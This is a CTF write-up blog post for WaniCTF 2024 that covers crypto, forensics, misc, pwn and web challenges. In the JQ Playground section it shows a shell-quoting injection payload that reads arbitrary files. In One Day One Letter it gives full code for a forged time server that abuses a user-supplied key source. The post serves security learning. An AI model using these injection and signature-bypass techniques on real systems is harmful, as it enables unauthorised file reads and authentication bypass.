---
layout: post
title: WaniCTF 2024 Writeups
categories: CTF
excerpt: Challenges I solved from WaniCTF, 2024.
---

<h1>
    WaniCTF 2024 Writeups
</h1>

(I didn't solve most challs. I was quite busy last weekend so I didn't get to try out the other challenges. I'll still write up the ones I solved, though.)

<h2>
    Crypto / beginners_rsa
</h2>

Challenge description:

```
Do you know RSA?
```

We are given a chall<span></span>.py and an output.txt.

chall<span></span>.py:

```python
from Crypto.Util.number import *

p = getPrime(64)
q = getPrime(64)
r = getPrime(64)
s = getPrime(64)
a = getPrime(64)
n = p*q*r*s*a
e = 0x10001

FLAG = b'FLAG{This_is_a_fake_flag}'
m = bytes_to_long(FLAG)
enc = pow(m, e, n)
print(f'n = {n}')
print(f'e = {e}')
print(f'enc = {enc}')
```

From here, we see that this is another case of "RSA with multiple factors". There have been a lot of writeups about this specific attack, but the basic idea here is that because N is a product of a few primes, it makes it easier to factorize. Here, I'm using sagemath's factor() function to factorize the n.

![Screenshot 2024-06-24 at 06.58.43](https://hackmd.io/_uploads/rygpL4UUR.png)

(and it does it really quickly too)

Now that we have the value of n, e, enc, and also the factors (p, q, r, s, a), we can start the decryption process.


```python
from Crypto.Util.number import inverse, long_to_bytes

n = 317903423385943473062528814030345176720578295695512495346444822768171649361480819163749494400347
e = 65537
enc = 127075137729897107295787718796341877071536678034322988535029776806418266591167534816788125330265
p = 9953162929836910171
q = 11771834931016130837
r = 12109985960354612149
s = 13079524394617385153
a = 17129880600534041513
phi = (p-1)*(q-1)*(r-1)*(s-1)*(a-1)
d = inverse(e, phi)
text = pow(enc, d, n)
print(long_to_bytes(text))
```

Which outputs:

`FLAG{S0_3a5y_1254!!}`

<h2>
    Forensics / tiny_usb
</h2>

Challenge description:
```
What a small usb!
```

This challenge was quite straightforward. We are given a chal_tiny_usb.iso, and that's it.

To solve it, you just need to mount it to your disk. Pretty simple. Once you do that, you'll find a flag. 
![FLAG](https://hackmd.io/_uploads/HyWOu48LR.png)

So, the answer is:

`FLAG{hey_i_just_bought_a_usb}`


<h2>
    Forensics / Surveillance_of_sus
</h2>

Challenge description:
```
悪意ある人物が操作しているのか、あるPCが不審な動きをしています。

そのPCから何かのキャッシュファイルを取り出すことに成功したらしいので、調べてみてください！

A PC is showing suspicious activity, possibly controlled by a malicious individual.

It seems a cache file from this PC has been retrieved. Please investigate it!
```

The challenge contains only one file, which is Cache_chal.bin.

The first step of solving this is obviously to identify what file format it is, but unfortunately running `file Cache_chal.bin` was not enough. However, opening the file in a hex editor showed this as the first few bytes of the file:

![Screenshot 2024-06-24 at 07.11.02](https://hackmd.io/_uploads/HkQotN88A.png)

RDP8bmp. 

Googling this, we can find that RDP8bmp is a header for an RDP bitmap cache. Fortunately, there exists an [online solver](https://github.com/ANSSI-FR/bmc-tools) for this. I simply just clone into this repository, and then ran the python code.

`python3 bmc-tools.py -s Cache_chal.bin -d . -b`

Which outputted:

```
[+++] Processing a single file: 'Cache_chal.bin'.
[===] 650 tiles successfully extracted in the end.
[===] Successfully exported 650 files.
[===] Successfully exported collage file.
```

Cool, now we can check the auto-generated Cache_chal.bin_collage.bmp file to see our flag.

![Screenshot 2024-06-24 at 07.17.15](https://hackmd.io/_uploads/B1tMiVLUA.png)

You can say that the file is messy here, but we can see the flag on the top left in plain sight.

`FLAG{RDP_is_useful_yipeee}`

<h2>
    Forensics / codebreaker
</h2>

Challenge description:

```
I, the codebreaker, have broken the QR code!
```

We are given one file titled chal_codebreaker.png. 
![chal_codebreaker](https://hackmd.io/_uploads/HJ6tsV8LC.png)

It is an image of a QR code, but it is crossed out so that it can't be scanned. But we can recover it!

Now, I'm sure this may look funny, but I solved this by manually restoring the QR code, and here's how I did it.

We can start by filling in the few parts of the QR code that you know will be filled with white, which is the corner squares. 

![Screenshot 2024-06-24 at 07.21.29](https://hackmd.io/_uploads/r1dfh4II0.png)

And of course, you can always draw over the black lines to restore the white lines. Really funny, actually.

![Screenshot 2024-06-24 at 07.22.45](https://hackmd.io/_uploads/BJ4v3ELUC.png)

Some parts were quite tricky though, but you can easily identify where a white square is supposed to be by looking at the pixels (each square is a 3x3 pixel). You can apply the same logic to the rest of the QR code when possible.

![Screenshot 2024-06-24 at 07.25.41](https://hackmd.io/_uploads/ryEGa4IIC.png)

In the end, I was left with just this QR code. Some parts of it were still crossed out, but thankfully google lens was able to scan this code.

![Screenshot 2024-06-24 at 07.26.36](https://hackmd.io/_uploads/rkcBpVIIC.png)

`FLAG{How_scan-dalous}`


<h2>
    Misc / JQ Playground
</h2>

Challenge description:

```
Let's use JQ!

JQを使いこなそう！

http://chal-lz56g6.wanictf.org:8000/
```

We are given a website http://chal-lz56g6.wanictf.org:8000/, and an attached zip containing the source code of the challenge. The most interesting file here that we need to solve is main<span></span>.py

main<span></span>.py:

```python
from flask import *
import subprocess

app = Flask(__name__)


@app.route("/")
def get():
    return render_template("index.tmpl")


@app.route("/", methods=["POST"])
def post():
    filter = request.form["filter"]
    print("[i] filter :", filter)
    if len(filter) >= 9:
        return render_template("index.tmpl", error="Filter is too long")
    if ";" in filter or "|" in filter or "&" in filter:
        return render_template("index.tmpl", error="Filter contains invalid character")
    command = "jq '{}' test.json".format(filter)
    ret = subprocess.run(
        command,
        shell=True,
        stdout=subprocess.PIPE,
        stderr=subprocess.PIPE,
        encoding="utf-8",
    )
    return render_template("index.tmpl", contents=ret.stdout, error=ret.stderr)


if __name__ == "__main__":
    app.run(host="0.0.0.0", port=8000, debug=True)

```

From the code above, we can see that the website just takes a user input, performs a POST request to the server, and run a jq command on it. However, the catch here is that we are limited to only using 8 or less character, as having 9 or more characters would stop us from submitting it.

We can start to fuzz for inputs here, and a bit of researching shows that you can input `--help` to see the list of available commands.

![Screenshot 2024-06-24 at 07.33.36](https://hackmd.io/_uploads/rkpy1BL8R.png)

Reading the available options to me, I saw the `-R` tag, which was available to read raw strings, not JSON texts. I thought that I could probably read the flag using this option, so I tried to run `-R /flag` on it, but obviously that did not work. This is because of this part in the code:

`command = "jq '{}' test.json".format(filter)`

This would only run `jq '-R /flag' test.json`, which wouldn't work, as we want the options to be outside of the quotes. So let's try to escape it by creating a payload of `'-R /flag'`, which would make the command run `jq '' -R /flag '' test.json`, which should read the flag, right?

No, because we have the length, filter, so how do we read the flag then?

We can use regex matching to solve this. So, with the help of this information, we can craft a payload that reads the flag (and any other files if available, but we're looking for just the flag here)

So, our payload now looks like `' -R /*'`, which means to "read raw strings from any files in /, which hopefully contains the flag"

Running this payload gives us:

![Screenshot 2024-06-24 at 07.41.00](https://hackmd.io/_uploads/rJpjgrU8R.png)

`FLAG{jqj6jqjqjqjqjqj6jqjqjqjqj6jqjqjq}`


<h2>
    Pwnable / nc
</h2>

Challenge description:

```
pwn問題はnc(net cat)コマンドを使って問題サーバに接続することがよくあります。ncの使い方を覚えておきましょう

下記コマンドをshellで実行することで問題サーバに接続することが出来ます。接続先で問題を解き、フラグを獲得してください

Pwn challenges often require connecting to the challenge server using the nc (netcat) command. It's important to learn how to use nc.

You can connect to the challenge server by executing the following command in your shell. Solve the problem at the connection point and obtain the flag.

nc chal-lz56g6.wanictf.org 9003
```

In order to solve this, you just need to connect to the nc given, and then it'll prompt you:

`15+1=0x[input]`

Where [input] is our input. Obviously this just means that we need to convert 15+1 = 16 (decimal) to hex (as shown by the 0x), which is 0x10. 

`FLAG{th3_b3ginning_0f_th3_r0ad_to_th3_pwn_p1ay3r}`

(alternatively the attachment also gave the flag)


<h2>
    Web / One Day One Letter
</h2>

Challenge description: 

```
果報は寝て待て

Everything comes to those who wait

https://web-one-day-one-letter-lz56g6.wanictf.org/
```

So, we are given a website: https://web-one-day-one-letter-lz56g6.wanictf.org/

Here, the flag is already given out to you. However, only one letter of the flag is revealed every day. A viable solution is to wait a few days, but the CTF Challenge would have ended at that point. So, we need to craft our own solution. The attachment provided us to two folders, content-server and time-server.

content-server has requirements.txt and server<span></span>.py. The server code is what we want to see now.

```python
import json
import os
from datetime import datetime
from http import HTTPStatus
from http.server import BaseHTTPRequestHandler, HTTPServer
from urllib.request import Request, urlopen
from urllib.parse import urljoin

from Crypto.Hash import SHA256
from Crypto.PublicKey import ECC
from Crypto.Signature import DSS

FLAG_CONTENT = os.environ.get('FLAG_CONTENT', 'abcdefghijkl')
assert len(FLAG_CONTENT) == 12
assert all(c in 'abcdefghijklmnopqrstuvwxyz' for c in FLAG_CONTENT)

def get_pubkey_of_timeserver(timeserver: str):
    req = Request(urljoin('https://' + timeserver, 'pubkey'))
    with urlopen(req) as res:
        key_text = res.read().decode('utf-8')
        return ECC.import_key(key_text)

def get_flag_hint_from_timestamp(timestamp: int):
    content = ['?'] * 12
    idx = timestamp // (60*60*24) % 12
    content[idx] = FLAG_CONTENT[idx]
    return 'FLAG{' + ''.join(content) + '}'

class HTTPRequestHandler(BaseHTTPRequestHandler):
    def do_OPTIONS(self):
        self.send_response(200, "ok")
        self.send_header('Access-Control-Allow-Origin', '*')
        self.send_header('Access-Control-Allow-Methods', 'POST, OPTIONS')
        self.send_header("Access-Control-Allow-Headers", "X-Requested-With")
        self.send_header("Access-Control-Allow-Headers", "Content-Type")
        self.end_headers()

    def do_POST(self):
        try:
            nbytes = int(self.headers.get('content-length'))
            body = json.loads(self.rfile.read(nbytes).decode('utf-8'))

            timestamp = body['timestamp'].encode('utf-8')
            signature = bytes.fromhex(body['signature'])
            timeserver = body['timeserver']

            pubkey = get_pubkey_of_timeserver(timeserver)
            h = SHA256.new(timestamp)
            verifier = DSS.new(pubkey, 'fips-186-3')
            verifier.verify(h, signature)
            self.send_response(HTTPStatus.OK)
            self.send_header('Content-Type', 'text/plain; charset=utf-8')
            self.send_header('Access-Control-Allow-Origin', '*')
            self.end_headers()
            dt = datetime.fromtimestamp(int(timestamp))
            res_body = f'''<p>Current time is {dt.date()} {dt.time()}.</p>
<p>Flag is {get_flag_hint_from_timestamp(int(timestamp))}.</p>
<p>You can get only one letter of the flag each day.</p>
<p>See you next day.</p>
'''
            self.wfile.write(res_body.encode('utf-8'))
            self.requestline
        except Exception:
            self.send_response(HTTPStatus.UNAUTHORIZED)
            self.end_headers()

handler = HTTPRequestHandler
httpd = HTTPServer(('', 5000), handler)
httpd.serve_forever()
```

This may seem like a headache, but let's see what the time-server contained. It contains a requirements.txt and also a server<span></span>.py. We still want to look at the server file for this.

```python
from http import HTTPStatus
from http.server import BaseHTTPRequestHandler, HTTPServer
import json
import time
from Crypto.Hash import SHA256
from Crypto.PublicKey import ECC
from Crypto.Signature import DSS

key = ECC.generate(curve='p256')
pubkey = key.public_key().export_key(format='PEM')

class HTTPRequestHandler(BaseHTTPRequestHandler):
    def do_GET(self):
        if self.path == '/pubkey':
            self.send_response(HTTPStatus.OK)
            self.send_header('Content-Type', 'text/plain; charset=utf-8')
            self.send_header('Access-Control-Allow-Origin', '*')
            self.end_headers()
            res_body = pubkey
            self.wfile.write(res_body.encode('utf-8'))
            self.requestline
        else:
            timestamp = str(int(time.time())).encode('utf-8')
            h = SHA256.new(timestamp)
            signer = DSS.new(key, 'fips-186-3')
            signature = signer.sign(h)
            self.send_response(HTTPStatus.OK)
            self.send_header('Content-Type', 'text/json; charset=utf-8')
            self.send_header('Access-Control-Allow-Origin', '*')
            self.end_headers()
            res_body = json.dumps({'timestamp' : timestamp.decode('utf-8'), 'signature': signature.hex()})
            self.wfile.write(res_body.encode('utf-8'))

handler = HTTPRequestHandler
httpd = HTTPServer(('', 5001), handler)
httpd.serve_forever()

```

At first, I saw this challenge and got immediately scared because I thought that this was going to be a crypto challenge. I thought that you had to somehow somehow break ECC or somehow get the private key. I looked at a lot of solutions and writeups for this, and slowly I realized how dumb this was. That was until I took another look at content-server instead of focusing at time-server, and then it clicked.

![Screenshot 2024-06-24 at 07.58.02](https://hackmd.io/_uploads/ryUoEBUIC.png)

I realized that the vulnerability here is that every time you reload the website, it sends a post request to itself containing three things:

The timestamp, the signature (to prevent timestamp from being easily modified), and the timeserver. I originally thought this was restricted to the challenge's own timeserver, but no. You can specify any website as a timeserver. 

Knowing this, I immediately went and modified the time-server to make my own time-server.

```python
from http import HTTPStatus
from http.server import BaseHTTPRequestHandler, HTTPServer
import json
import time
from datetime import datetime, timedelta
from Crypto.Hash import SHA256
from Crypto.PublicKey import ECC
from Crypto.Signature import DSS

key = ECC.generate(curve='p256')
pubkey = key.public_key().export_key(format='PEM')

class FakeTimeServerRequestHandler(BaseHTTPRequestHandler):
    def do_GET(self):
        if self.path == '/pubkey':
            self.send_response(HTTPStatus.OK)
            self.send_header('Content-Type', 'text/plain; charset=utf-8')
            self.send_header('Access-Control-Allow-Origin', '*')
            self.end_headers()
            res_body = pubkey
            self.wfile.write(res_body.encode('utf-8'))
        else:
            future_timestamp = int(time.time() + 1 * 24 * 60 * 60)
            future_timestamp_str = str(future_timestamp).encode('utf-8')
            h = SHA256.new(future_timestamp_str)
            signer = DSS.new(key, 'fips-186-3')
            signature = signer.sign(h)
            self.send_response(HTTPStatus.OK)
            self.send_header('Content-Type', 'text/json; charset=utf-8')
            self.send_header('Access-Control-Allow-Origin', '*')
            self.end_headers()
            res_body = json.dumps({
                'timestamp': future_timestamp_str.decode('utf-8'),
                'signature': signature.hex()
            })
            self.wfile.write(res_body.encode('utf-8'))

handler = FakeTimeServerRequestHandler
httpd = HTTPServer(('', 5001), handler)
print("Serving on port 5001...")
httpd.serve_forever()
```

The only thing I changed here was the timestamp, and created a timestamp for one day ahead (1x24x60x60 to calculate unix timestamp). This way, I had my own public key and I am able to set the timeserver to anything. This means that I can find the answer by sending a timestamp and signature that matches my server's signature. Obviously, I changed the future_timestamp accordingly. In my case, I originally had it at 1 to leak the second character of the flag, then if I wanted to set it to 2 to leak the flag, I'd use  `future_timestamp = int(time.time() + 2 * 24 * 60 * 60)` and so on. I used python http and served it with ngrok. Really simple technique, really.

But once you do that, you have the whole flag.

`FLAG{lyingthetime}`


# 

That's all for the writeups, I wish I had more time to solve this, but I was also attempting Google CTF (only 1 solve sadly) and was also quite busy with my real life stuff. 

But anyways, I had fun, and I hope you learned something from this writeup too.